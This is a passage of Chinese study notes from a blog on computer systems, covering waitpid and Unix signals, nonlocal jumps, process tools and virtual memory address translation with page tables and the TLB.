stdout文件是被打开的，并指向屏幕。子进程继承了这个文件，因此它的输出也是指向屏幕的。</p></li></ul><p><img src="/2021/07/04/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86/image-20210615201857583.png" alt="image-20210615201857583"></p><h4 id="8-4-3-回收子进程"><a href="#8-4-3-回收子进程" class="headerlink" title="8.4.3 回收子进程"></a>8.4.3 回收子进程</h4><p><strong>僵死进程：</strong>一个终止了但未被回收的进程</p><p><strong>waitpid函数：</strong></p><p><img src="/2021/07/04/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86/image-20210615203910901.png" alt="image-20210615203910901"></p><p>默认地(当 options=0时)， waitpid<strong>挂起</strong>调用进程的执行，直到它的等待集合中的一个子进程终止。</p><p>如果等待集合中的一个进程在刚调用的时刻就已经终止了，那么 waitpid就立即返回。在这两种情况下， waitpid返回导致 waitpid返回的<strong>已终止子进程的PID</strong>,并且将这个已终止的子进程从系统中去除。</p><ol><li><p><strong>判断等待集合的成员</strong></p><p>等待集合的成员是由参数pid来确定的：</p><ul><li>如果pid&gt;0,那么等待集合就是一个单独的子进程，它的进程D等于pid</li><li>如果pid=-1,那么等待集合就是由父进程所有的子进程组成的。</li></ul></li><li><p><strong>修改默认行为</strong></p><p>可以通过将 options设置为常量 WNOHANG和WUNTIRACED的各种组合，修改默认行为</p><ul><li>**WNOHANG:**如果等待集合中的任何子进程都还没有终止，那么就立即返回（返回值为0)。默认的行为是挂起调用进程，直到有子进程终止。在等待子进程终止的同时，如果还想做些有用的工作，这个选项会有用</li><li>**WUNTRACED:**挂起调用进程的执行，直到等待集合中的一个进程变成已终止或者被停止。返回的PD为导致返回的已终止或被停止子进程的PD。默认的行为是只返回已终止的子进程。当你想要检查已终止和被停止的子进程时，这个选项会有用。</li><li><strong>WNOHANG|WUNTRACED</strong>:立即返回，如果等待集合中没有任何子进程被停止或已终止，那么返回值为0,或者返回值等于那个被停止或者已终止的子进程的PID。</li></ul></li><li><p><strong>检查已回收子进程的退出状态</strong></p><p>如果 status参数是非空的，那么 waitpid就会在 status参数中放上关于导致返回的子进程的状态信息。wait,h头文件定义了解释 status参数的几个宏：</p><ul><li>**WIFEXITED(status)**：如果子进程通过调用exit或者一个返回(return)正常终止，就返回真。</li><li><strong>WEXITSTATUS(status):</strong> 返回一个正常终止的子进程的退出状态。只有在 WIFEXITED返回为真时，才会定义这个状态。</li><li><strong>WIFSIGNALED(status):</strong> 如果子进程是因为一个未被捕获的信号终止的，那么就返回真(将在8.5节中解释说明信号)。</li><li><strong>WTERMSIG(status):</strong> 返回导致子进程终止的信号的数量。只有在 WIFSIGNALED(status)返回为真时，才定义这个状态。</li><li><strong>WIFSTOPPED(status):</strong> 如果引起返回的子进程当前是被停止的，那么就返回真。</li><li>WSTOPSIG(status): 返回引起子进程停止的信号的数量。只有在 WIFSTOPPED(status)返回为真时，才定义这个状态。</li></ul></li><li><p><strong>错误条件</strong></p><p>如果调用进程没有子进程，那么 waitpid返回-1,并且设置 errno为 <strong>ECHILD</strong>。如果waitpid函数被一个信号中断，那么它返回-1,并设置 errno为 <strong>EINTR</strong>。</p></li><li><p>wait<strong>函数</strong></p><p><img src="/2021/07/04/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86/image-20210615205135841.png" alt="image-20210615205135841"></p></li></ol><h4 id="8-4-4-让进程休眠"><a href="#8-4-4-让进程休眠" class="headerlink" title="8.4.4 让进程休眠"></a>8.4.4 让进程休眠</h4><p><strong>sleep函数</strong></p><p><img src="/2021/07/04/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86/image-20210615205249733.png" alt="image-20210615205249733"></p><p><strong>pause函数</strong></p><p><img src="/2021/07/04/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86/image-20210615205335143.png" alt="image-20210615205335143"></p><h4 id="8-4-5-加载并运行程序"><a href="#8-4-5-加载并运行程序" class="headerlink" title="8.4.5 加载并运行程序"></a>8.4.5 加载并运行程序</h4><h4 id="8-4-6-利用fork和execve运行程序"><a href="#8-4-6-利用fork和execve运行程序" class="headerlink" title="8.4.6 利用fork和execve运行程序"></a>8.4.6 利用fork和execve运行程序</h4><hr><h3 id="8-5-信号"><a href="#8-5-信号" class="headerlink" title="8.5 信号"></a>8.5 信号</h3><p><strong>信号</strong>就是一条小消息，它通知进程系统中发射了一个某种类型的事件。</p><p><img src="/2021/07/04/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86/image-20210616132126470.png" alt="image-20210616132126470"></p><h4 id="8-5-1-信号术语"><a href="#8-5-1-信号术语" class="headerlink" title="8.5.1 信号术语"></a>8.5.1 信号术语</h4><p>传送一个信号到目的进程是由两个不同步骤组成的：</p><ul><li><strong>发送信号</strong>。内核通过更新目的进程上下文中的某个状态，发送（递送）一个信号给目的进程。发送信号可以有如下两个原因：<ul><li><ol><li>内核检测到一个系统事件，比如被零除错误或者<br>子进程终止。</li></ol></li><li><ol start="2"><li>一个进程调用了kill函数（在下一节中讨论），显式地要求内核发送一个信号给目的进程。一个进程可以发送信号给它自己。</li></ol></li></ul></li><li><strong>接收信号</strong>。当目的进程被内核强迫以某种方式对信号的发送做出反应时，目的进程就接收了信号。进程可以忽略这个信号，终止或者通过执行一个称为信号处理程序（signal handler)的用户层函数捕获这个信号。</li></ul><p><img src="/2021/07/04/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86/image-20210616134151781-1623822116278.png" alt="image-20210616134151781"></p><p><strong>待处理信号（pending signal)：</strong>一个只发出而没有被接收的信号。</p><ul><li><p>在任何时刻，一种类型只会有有一个待处理信号。</p></li><li><p>一个进程可以有选择性地阻塞接受某种信号。当一种信号被阻塞时，它仍可以被发送，但是产生的待处理信号不会被接受，知道进程取消对这种信号的阻塞。</p></li><li><p>一个待处理信号最多被接受一次。</p></li></ul><h4 id="8-5-2-发送信号"><a href="#8-5-2-发送信号" class="headerlink" title="8.5.2 发送信号"></a>8.5.2 发送信号</h4><ol><li><p><strong>进程组</strong></p><p><img src="/2021/07/04/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86/image-20210616135725636.png" alt="image-20210616135725636"></p><p><img src="/2021/07/04/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86/image-20210616135744711.png" alt="image-20210616135744711"></p></li><li><p><strong>用/bin/kill程序发送信号</strong></p><p><img src="/2021/07/04/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86/image-20210616135759238.png" alt="image-20210616135759238"></p></li><li><p><strong>从键盘发送信号</strong></p><p><img src="/2021/07/04/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86/image-20210616140206513.png" alt="image-20210616140206513"></p><p><img src="/2021/07/04/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86/image-20210616140217571.png" alt="image-20210616140217571"></p></li><li><p><strong>用kill函数发送信号</strong></p><p><img src="/2021/07/04/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86/image-20210616140454210.png" alt="image-20210616140454210"></p></li><li><p><strong>用alarm函数发生信号</strong></p><p><img src="/2021/07/04/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86/image-20210616141623550.png" alt="image-20210616141623550"></p><p><img src="/2021/07/04/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86/image-20210616141648506.png" alt="image-20210616141648506"></p></li></ol><h4 id="8-5-3-接收信号"><a href="#8-5-3-接收信号" class="headerlink" title="8.5.3 接收信号"></a>8.5.3 接收信号</h4><p>当内核从一个异常处理程序返回，准备将控制传递给进程P时，它会检查进程P的未被阻塞的待处理信号的集合( pending&amp;~ blocked)。如果这个集合为空（通常情况下），那么内核将控制传递到p的逻辑控制流中的下一条指令(l<del>next</del>).<br>然而，如果集合是非空的，那么内核选择集合中的某个信号k(通常是最小的k),并且强制P接收信号k。收到这个信号会触发进程的某种行为。一旦进程完成了这个行为，那么控制就传递回P的逻辑控制流中的下一条指令(l<del>next</del>)。</p><p>每个信号类型都有一个预定义的<strong>默认行为</strong>，是下面中的一种：</p><ul><li>进程终止。</li><li>进程终止并转储存储器 (dump core)。</li><li>进程停止直到被 SIGCONT信号重启。</li><li>进程忽略该信号。</li></ul><p><strong>signal函数：</strong></p><p>进程通过使用一个signal函数修改和信号相关联的默认行为</p><p><img src="/2021/07/04/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86/image-20210616143233373.png" alt="image-20210616143233373"></p><p>signal函数可以通过下列三种方法之一来改变和信号 signum相关联的行为：</p><ul><li>如果 handler是SIG_IGN,那么忽略类型为 signum的信号。</li><li>如果 handler是SIG_DFL,那么类型为 signum的信号行为恢复为默认行为。</li><li>否则， handler就是用户定义的函数的地址，这个函数称为<strong>信号处理程序</strong>（ signal handler),只要进程接收到一个类型为 signum的信号，就会调用这个程序。通过把处理程序的地址传递到 signal函数从而改变默认行为，这叫做<strong>设置信号处理程序</strong>（installing the handler)。调用信号处理程序称为<strong>捕获信号</strong>。执行信号处理程序称为<strong>处理信号</strong>。</li></ul><p><img src="/2021/07/04/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86/image-20210616150205507.png" alt="image-20210616150205507"></p><p><img src="/2021/07/04/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86/image-20210616150220611.png" alt="image-20210616150220611"></p><h4 id="8-5-4-信号处理问题"><a href="#8-5-4-信号处理问题" class="headerlink" title="8.5.4 信号处理问题"></a>8.5.4 信号处理问题</h4><p>要捕获多个信号的一些问题：</p><ul><li><strong>待处理信号被阻塞</strong>。Unix信号处理程序通常会阻塞当前处理程序正在处理的类型的待处理信号。比如，假设一个进程捕获了一个 SIGINT信号，并且当前正在运行它的 SIGINT处理程序。如果另一个 SIGINT信号传递到这个进程，那么这个 SIGINT将变成待处理的，但是不会被接收，直到处理程序返回。</li><li><strong>待处理信号不会排队等待</strong>。任意类型至多只有一个待处理信号。因此，如果有两个类型为k的信号传送到一个目的进程，而由于目的进程当前正在执行信号k的处理程序，所以信号k是阻塞的，那么第二个信号就被简单地丢弃，它不会排队等待。关键思想是存在一个待处理的信号仅仅表明至少已经有一个信号到达了。</li><li><strong>系统调用可以被中断</strong>。像read、wait和 accept这样的系统调用潜在地会阻塞进程一段较长的时间，称为慢速系统调用。在某些系统中，当处理程序捕获到一个信号时，被中断的慢速系统调用在信号处理程序返回时不再继续，而是立即返回给用户一个错误条件，并将 errno设置为 EINTR。</li></ul><h4 id="8-5-5-可移植的信号处理"><a href="#8-5-5-可移植的信号处理" class="headerlink" title="8.5.5 可移植的信号处理"></a>8.5.5 可移植的信号处理</h4><p>为了处理不同系统之间信号处理语义的差异，可以定义一个包装函数，称为Signal。它的调用方式和signal函数的调用方式一样。</p><p>Signal包装函数设置了一个信号处理程序，其信号处理语义如下：</p><ul><li>只有这个处理程序当前正在处理的那种类型的信号被阻塞</li><li>和所有信号实现一样，信号不会排队等待。</li><li>只要可能，被中断的系统调用会自动重启。</li><li>一旦设置了信号处理程序，它就会一直保持，直到 Signal带着 handler参数为SIG_IGN或者 SIG_DFL被调用。（一些比较老的Unⅸ系统会在一个处理程序处理完一个信号之后，将信号行为恢复为它的默认行为。）</li></ul><h4 id="8-5-6-显示地阻塞和取消阻塞信号"><a href="#8-5-6-显示地阻塞和取消阻塞信号" class="headerlink" title="8.5.6 显示地阻塞和取消阻塞信号"></a>8.5.6 显示地阻塞和取消阻塞信号</h4><p><img src="/2021/07/04/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86/image-20210616155200810.png" alt="image-20210616155200810"></p><h4 id="8-5-7-同步流以避免讨厌的并发错误"><a href="#8-5-7-同步流以避免讨厌的并发错误" class="headerlink" title="8.5.7 同步流以避免讨厌的并发错误"></a>8.5.7 同步流以避免讨厌的并发错误</h4><p><img src="/2021/07/04/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86/image-20210616155703781.png" alt="image-20210616155703781"></p><p><img src="/2021/07/04/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86/image-20210616155808141.png" alt="image-20210616155808141"></p><p><img src="/2021/07/04/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86/image-20210616155726929.png" alt="image-20210616155726929"></p><p><img src="/2021/07/04/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86/image-20210616155823683.png" alt="image-20210616155823683"></p><p><img src="/2021/07/04/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86/image-20210616155903713.png" alt="image-20210616155903713"></p><hr><h3 id="8-6-非本地跳转"><a href="#8-6-非本地跳转" class="headerlink" title="8.6 非本地跳转"></a>8.6 非本地跳转</h3><p><strong>非本地跳转：</strong></p><p>C语言提供了一种用户级异常控制流形式，称为<strong>非本地跳转</strong>( nonlocal jump),它将控制直接从一个函数转移到另一个当前正在执行的函数，而不需要经过正常的调用一返回序列。非本地跳转是通过 setjmp和longjmp函数来提供的。</p><p><img src="/2021/07/04/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86/image-20210616160043032.png" alt="image-20210616160043032"></p><ul><li><p>非本地跳转的一个重要应用：允许从一个深层嵌套的函数调用中立即返回，通常是由检测到某个错误情况引起的。</p></li><li><p>非本地跳转的另一个重要应用：是使一个信号处理程序分支到一个特殊的代码位置，而不是返回到被信号到达中断了的指令的位置。</p></li></ul><h3 id="8-7-操作进程的工具"><a href="#8-7-操作进程的工具" class="headerlink" title="8.7 操作进程的工具"></a>8.7 操作进程的工具</h3><p>Linux系统提供了大量的监控和操作进程的有用工具：</p><ul><li><strong>STRACE</strong>: 打印一个正在运行的程序和它的子进程调用的每个系统调用的轨迹。对于好奇的学生而言，这是一个令人着迷的工具。用- static编译你的程序，能得到一个更干净的、不带有大量与共享库相关的输出的轨迹。</li><li><strong>PS</strong>: 列出当前系统中的进程（包括僵死进程）。</li><li><strong>TOP</strong>: 打印出关于当前进程资源使用的信息</li><li><strong>PMAP</strong>: 显示进程的存储器映射。</li><li>/<strong>proc</strong>: 一个虚拟文件系统，以ASCII文本格式输出大量内核数据结构的内容，用户程序可以读取这些内容。比如，输入“cat/proc/loadavg”，观察在Linux系统上当前的平均负载。</li></ul><hr><h2 id="第九章-虚拟存储器"><a href="#第九章-虚拟存储器" class="headerlink" title="第九章 虚拟存储器"></a>第九章 虚拟存储器</h2><h3 id="9-1-物理和虚拟寻址"><a href="#9-1-物理和虚拟寻址" class="headerlink" title="9.1 物理和虚拟寻址"></a>9.1 物理和虚拟寻址</h3><p><strong>物理寻址：</strong></p><p><img src="/2021/07/04/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86/image-20210616173343847.png" alt="image-20210616173343847"></p><p><strong>虚拟寻址：</strong></p><p>使用虚拟寻址时，CPU通过生成一个虚拟地址( Virtual Address,VA)来访问主存，这个虚拟地址在被送到存储器之前先转换成适当的物理地址。将一个虚拟地址转换为物理地址的任务叫做地址翻译(address translation)。</p><p><img src="/2021/07/04/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86/image-20210616173400967.png" alt="image-20210616173400967"></p><hr><h3 id="9-2-地址空间"><a href="#9-2-地址空间" class="headerlink" title="9.2 地址空间"></a>9.2 地址空间</h3><p>地址空间是一个非负整数的有序集合：</p><p>{0,1,2，···}</p><p>虚拟地址空间：{0,1,2，···，N-1}</p><p>物理地址空间：{0,1,2，···，M-1}</p><p>地址空间的概念是很重要的，因为它清楚地区分了数据对象（字节）和它们的属性（地址）。一旦认识到了这种区别，那么我们就可以将其推广，允许每个数据对象有多个独立的地址，其中每个地址都选自一个不同的地址空间。这就是虚拟存储器的基本思想。主存中的每个字节都有个选自虚拟地址空间的虚拟地址和一个选自物理地址空间的物理地址。</p><hr><h3 id="9-3-虚拟存储器作为缓存的工具"><a href="#9-3-虚拟存储器作为缓存的工具" class="headerlink" title="9.3 虚拟存储器作为缓存的工具"></a>9.3 虚拟存储器作为缓存的工具</h3><p><strong>虚拟存储器</strong>(VM)被组织为一个由存放在磁盘上的N个连续的字节大小的单元组成的数组。每字节都有一个唯一的虚拟地址，这个唯一的虚拟地址是作为到数组的索引的。</p><p>VM系统将虚拟存储器分割为称为<strong>虚拟页</strong>( Virtual Page,VP)的大小固定的块。每个虚拟页的大小为P=2^p^字节。</p><p>类似地，物理存储器被分割为<strong>物理页</strong>( Physical Page,PP),大小也为P字节（物理页也称为页帧( page frame))。</p><p>一个n位的地址空间有2^n-p^页</p><p>在任意时刻，虚拟页面的集合都分为三个不相交的子集：</p><ul><li><strong>未分配的</strong>：VM系统还未分配（或者创建）的页。未分配的块没有任何数据和它们相关联，因此也就不占用任何磁盘空间。</li><li><strong>缓存的</strong>：当前缓存在物理存储器中的已分配页。</li><li><strong>未缓存的</strong>：没有缓存在物理存储器中的已分配页。</li></ul><p><img src="/2021/07/04/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86/image-20210616175211113.png" alt="image-20210616175211113"></p><h4 id="9-3-1-DRAM缓存的组织结构"><a href="#9-3-1-DRAM缓存的组织结构" class="headerlink" title="9.3.1 DRAM缓存的组织结构"></a>9.3.1 DRAM缓存的组织结构</h4><p>SRAM缓存：位于CPU和主存之间的L1、L2和L3高速缓存</p><p>DRAM缓存：虚拟存储器系统的缓存，它在主存中缓存虚拟页</p><p><strong>DRAM缓存的组织结构：</strong></p><ul><li>SRAM比DRAM快大约10倍，DRAM要比磁盘快大约100000多倍</li><li>巨大的不命中处罚和访问第一字节的开销</li><li>由于大的不命中处罚，DRAM缓存是全相连的</li><li>使用写回而不是直写</li></ul><h4 id="9-3-2-页表"><a href="#9-3-2-页表" class="headerlink" title="9.3.2 页表"></a>9.3.2 页表</h4><p>页表存放在<strong>物理存储器</strong>中</p><p><strong>页表</strong>就是一个<strong>页表条目</strong>（PTE）的数组，负责将虚拟页映射到物理页。每次地址翻译软件将一个虚拟地址转换成物理地址时都会读取页表。操作系统负责维护页表的内容，以及在磁盘和DRAM之间来回传送页。</p><p>每个PTE由一个有效位和一个n位地址字段组成</p><ul><li><p>设置了有效位（已缓存）</p><p>表明该虚拟页被缓存在DRAM中，地址字段表示DRAM中相应的物理页的起始位置，这个物理页缓存了该虚拟页</p></li><li><p>未设置有效位（还未被缓存）</p><ul><li>一个空地址表示这个虚拟页还未被分配</li><li>否则这个地址指向该虚拟页在磁盘上的起始位置（已分配未缓存）</li></ul></li></ul><p><img src="/2021/07/04/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86/image-20210616211103583.png" alt="image-20210616211103583"></p><h4 id="9-3-3-页命中"><a href="#9-3-3-页命中" class="headerlink" title="9.3.3 页命中"></a>9.3.3 页命中</h4><p>地址翻译硬件将虚拟地址作为一个索引来定位PTE 2,并从存储器中读取它。因为设置了有效位，那么地址翻译硬件就知道VP 2是缓存在存储器中的了。所以它使用PTE中的物理存储器地址（该地址指向PP 1中缓存页的起始位置），构造出这个字的物理地址。</p><h4 id="9-3-4-缺页"><a href="#9-3-4-缺页" class="headerlink" title="9.3.4 缺页"></a>9.3.4 缺页</h4><p>DRAM缓存不命中称为<strong>缺页</strong></p><p>发现缺页后触发一个缺页异常，调用内核中的缺页异常处理程序，在物理页中选择一个牺牲页，如果牺牲页被修改过了则将牺牲页保存回磁盘，无论是否修改，内核都会修改牺牲页的PTE，然后将目标虚拟页缓存到磁盘中对应的物理页，更新目标页的PTE，然后异常处理程序返回，它会重新启动导致缺页的指令。</p><p><strong>交换</strong>( swapping)或者<strong>页面调度</strong>( paging)：在磁盘和存储器之间传送页的活动。</p><p>页从磁盘换入（或者页面调入）DRAM和从DRAM换出（或者页面调出）磁盘。</p><p><strong>按需页面调度：</strong>一直等待，直到最后时刻，也就是当有不命中发生时，才换入页面的一种策略</p><h4 id="9-3-5-分配页面"><a href="#9-3-5-分配页面" class="headerlink" title="9.3.5 分配页面"></a>9.3.5 分配页面</h4><p><img src="/2021/07/04/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86/image-20210616212903869.png" alt="image-20210616212903869"></p><h4 id="9-3-6-又是局部性救了我们"><a href="#9-3-6-又是局部性救了我们" class="headerlink" title="9.3.6 又是局部性救了我们"></a>9.3.6 又是局部性救了我们</h4><p>尽管在整个运行过程中程序引用的不同页面的总数可能超出物理存储器总的大小，但是局部性原则保证了在任意时刻，程序将往往在一个较小的活动页面( active page)集合上工作，这个集合叫做工作集( working set)或者常驻集( resident set)。在初始开销，也就是将工作集页面调度到存储器中之后，接下来对这个工作集的引用将导致命中，而不会产生额外的磁盘流量</p><p>如果工作集的大小超出了物理存储器的大小，那么程序将产生一种不幸的状态，叫做<strong>颠簸(</strong> thrashing),这时页面将不断地<br>换进换出。虽然虚拟存储器通常是有效的，但会很慢。</p><hr><h3 id="9-4-虚拟存储器作为存储器管理的工具"><a href="#9-4-虚拟存储器作为存储器管理的工具" class="headerlink" title="9.4 虚拟存储器作为存储器管理的工具"></a>9.4 虚拟存储器作为存储器管理的工具</h3><p>VM简化了链接和加载、代码和数据共享，以及应用程序的存储器分配。</p><ul><li><strong>简化链接</strong>。独立的地址空间允许每个进程的存储器映像使用相同的基本格式，而不管代码和数据实际存放在物理存储器的何处。例如，像我们在图813中看到的，个给定的Linux系统上的每个进程都使用类似的存储器格式。文本节总是从虛拟地址0x08048000处开始(对于32位地址空间)，或者从0x400000处开始(对于64位地址空间)。数据和节紧跟在文本节后面。栈占据进程地址空间最高的部分，并向下生长。这样的一致性极大地简化了链接器的设计和实现，允许链接器生成全链接的可执行文件，这些可执行文件是独立于物理存储器中代码和数据的最终位置的。</li><li><strong>简化加载</strong>。虚拟存储器还使得容易向存储器中加载可执行文件和共享对象文件。回想一下第7章，在ELF可执行文件中.text和.data节是连续的。要把这些节加载到一个新创建的进程中， Linux加载器分配虚拟页的一个连续的片(chunk),从地址0x08048000处开始(对于32位地址空间)，或者从0x400000处开始(对于64位地址空间)，把这些虚拟页标记为无效的（即未被缓存的），将页表条目指向目标文件中适当的位置。有趣的是，加载器从不实际拷贝任何数据从磁盘到存储器。在每个页初次被引用时，要么是CPU取指令时引用的，要么是一条正在执行的指令引用一个存储器位置时引用的，虚拟存储器系统会按照需要自动地调入数据页。</li><li><strong>简化共享</strong>。独立地址空间为操作系统提供了一个管理用户进程和操作系统自身之间共享的致机制。一般而言，每个进程都有自己私有的代码、数据、堆以及栈区域，是不和其他进程共享的。在这种情况下，操作系统创建页表，将相应的虚拟页映射到不同的物理页面。</li><li><strong>简化存储器分配</strong>。虚拟存储器为向用户进程提供一个简单的分配额外存储器的机制。当个运行在用户进程中的程序要求额外的堆空间时(如调用ma11oc的结果)，操作系统分配一个适当数字(例如k)个连续的虚拟存储器页面，并且将它们映射到物理存储器中任意位置的k个任意的物理页面。由于页表工作的方式，操作系统没有必要分配k个连续的物理存储器页面。页面可以随机地分散在物理存储器中。</li></ul><hr><h3 id="9-5-虚拟存储器作为存储器保护的工具"><a href="#9-5-虚拟存储器作为存储器保护的工具" class="headerlink" title="9.5 虚拟存储器作为存储器保护的工具"></a>9.5 虚拟存储器作为存储器保护的工具</h3><p><img src="/2021/07/04/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86/image-20210616214509999.png" alt="image-20210616214509999"></p><p><img src="/2021/07/04/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86/image-20210616214520599.png" alt="image-20210616214520599"></p><p><img src="/2021/07/04/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86/image-20210616214457345.png" alt="image-20210616214457345"></p><hr><h3 id="9-6-地址翻译"><a href="#9-6-地址翻译" class="headerlink" title="9.6 地址翻译"></a>9.6 地址翻译</h3><p><img src="/2021/07/04/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86/image-20210617120441290.png" alt="image-20210617120441290">地址翻译是一个N元素的虚拟地址空间（VAS)中的元素和一个M元素的物理地址空间（PAS)中元素之间的映射，</p><p><img src="/2021/07/04/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86/image-20210618142508589.png" alt="image-20210618142508589"></p><p><strong>MMU如何利用页表来实现这种映射:</strong></p><p>CPU中的一个控制寄存器，<strong>页表基址寄存器</strong>( Page Table Base Register,PTBR)指向当前页表。</p><p>n位的虚拟地址包含两个部分：一个p位的<strong>虚拟页面偏移</strong>( Virtual Page Offset,<strong>VPO</strong>)和一个(n-p)位的<strong>虚拟页号</strong>（ Virtual Page Number,<strong>VPN</strong>).</p><p>MMU利用VPN来选择适当的PTE。例如，VPN0选择PTE0,VPN1选择PTE1,以此类推。</p><p>将页表条目中<strong>物理页号</strong>( Physical Page Number,PPN)和虚拟地址中的<strong>VPO</strong>串联起来，就得到相应的物理地址。</p><p>注意，因为物理和虚拟页面都是P字节的，所以<strong>物理页面</strong><br><strong>偏移</strong>( Physical Page Offset,PPO)和VPO是相同的。</p><p><img src="/2021/07/04/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86/image-20210618142837272.png" alt="image-20210618142837272"></p><p><strong>当页面命中时，CPU硬件执行的步骤:</strong></p><p><img src="/2021/07/04/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86/image-20210618143403713.png" alt="image-20210618143403713"></p><ul><li>第一步：处理器生成一个虚拟地址，并把它传送给MMU</li><li>第二步：MMU生成PTE地址，并从高速缓存/主存请求得到它。</li><li>第三步：高速缓存/主存向MMU返回PTE.</li><li>第四步：MMU构造物理地址，并把它传送给高速缓存/主存。</li><li>第五步：高速缓存/主存返回所请求的数据字给处理器。</li></ul><p>页面命中完全是由硬件来处理的，与之不同的是，<strong>处理缺页</strong>要求硬件和操作系统内核协作完成:</p><p><img src="/2021/07/04/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86/image-20210618143420468.png" alt="image-20210618143420468"></p><ul><li>第一步到第三步：和图9-13a中的第一步到第三步相同。</li><li>第四步：PTE中的有效位是零，所以MMU触发了一次异常，传递CPU中的控制到操作系统内核中的缺页异常处理程序。</li><li>第五步：缺页处理程序确定出物理存储器中的牺牲页，如果这个页面已经被修改了，则把它换出到磁盘。</li><li>第六步：缺页处理程序页面调入新的页面，并更新存储器中的PTE.</li><li>第七步：缺页处理程序返回到原来的进程，再次执行导致缺页的指令。CPU将引起缺页的虚拟地址重新发送给MMU。因为虚拟页面现在缓存在物理存储器中，所以就会命中，在MMU执行了图9-13b中的步骤之后，主存就会将所请求字返回给处理器。</li></ul><h4 id="9-6-1-结合高速缓存和虚拟存储器"><a href="#9-6-1-结合高速缓存和虚拟存储器" class="headerlink" title="9.6.1 结合高速缓存和虚拟存储器"></a>9.6.1 结合高速缓存和虚拟存储器</h4><p>图9-14展示了<strong>一个物理寻址的高速缓存如何和虚拟存储器结合起来</strong>。主要的思路是地址翻译发生在高速缓存査找之前。注意，页表条目可以缓存，就像其他的数据字一样。</p><p><img src="/2021/07/04/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86/image-20210618144221444.png" alt="image-20210618144221444"></p><h4 id="9-6-2-利用TLB加速地址翻译"><a href="#9-6-2-利用TLB加速地址翻译" class="headerlink" title="9.6.2 利用TLB加速地址翻译"></a>9.6.2 利用TLB加速地址翻译</h4><p><strong>翻译后备缓冲器（TLB）：</strong>许多系统为了消除存储器读数据的开销，它们在MMU中包括了一个关于PTE的小的缓存。</p><p>它用于组选择和行匹配的索引和标记字段是从虚拟地址中<br>的虚拟页号中提取出来的。如果TLB有T=2^t^个组，那么TLB索引(TLBI)是由VPN的t个最低位组成的，而TLB标记(TLBT)是由VPN中剩余的位组成的。</p><p><img src="/2021/07/04/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86/image-20210618145747729.png" alt="image-20210618145747729"></p><p><img 